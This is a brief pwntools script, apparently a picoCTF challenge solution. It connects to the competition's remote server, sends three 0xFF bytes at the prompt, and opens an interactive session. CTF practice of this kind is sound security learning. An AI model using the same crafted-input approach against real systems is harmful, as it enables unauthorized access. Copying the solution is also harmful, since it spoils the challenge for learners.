from pwn import *

io = remote("lonely-island.picoctf.net", 51936)

io.sendlineafter("==> ",b"\xFF"*3)

io.interactive()

io.close()
